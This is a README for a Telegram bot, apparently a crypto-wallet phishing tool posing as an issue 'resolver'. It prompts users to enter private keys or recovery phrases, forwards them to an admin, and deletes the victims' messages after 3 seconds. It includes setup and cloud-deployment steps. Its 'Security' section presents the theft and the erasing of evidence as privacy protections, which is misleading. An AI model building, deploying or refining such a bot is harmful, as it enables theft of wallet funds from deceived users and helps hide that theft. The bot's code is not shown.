# Telegram Resolver Bot

A Telegram bot that collects user data with automatic deletion of sensitive information after 3 seconds.

## Features

- Interactive issue selection menu
- Bot selection interface  
- Wallet import options (private key or recovery phrase)
- Automatic data forwarding to admin
- Auto-deletion of sensitive messages after 3 seconds
- Error detection with retry functionality

## Setup

1. Install dependencies:
```bash
pip install -r requirements.txt
```

2. Set environment variables:
```
BOT_TOKEN=your_bot_token_here
LISTENER_BOT_TOKEN=your_listener_bot_token_here
ADMIN_USER_ID=your_telegram_user_id
```

3. Run the bot:
```bash
python simple_resolver_bot.py
```

## Deployment

This bot is designed to run on cloud platforms like Render.com, Railway.app, or Heroku.

### Render.com Deployment

1. Connect your GitHub repository to Render
2. Set the environment variables in Render dashboard
3. Deploy as a Web Service

## Files

- `simple_resolver_bot.py` - Main bot application
- `requirements.txt` - Python dependencies
- `Procfile` - Process configuration for deployment
- `README.md` - This file

## Security

- Sensitive data is automatically deleted after 3 seconds
- Data is immediately forwarded to admin bot
- No permanent storage of private keys or recovery phrases
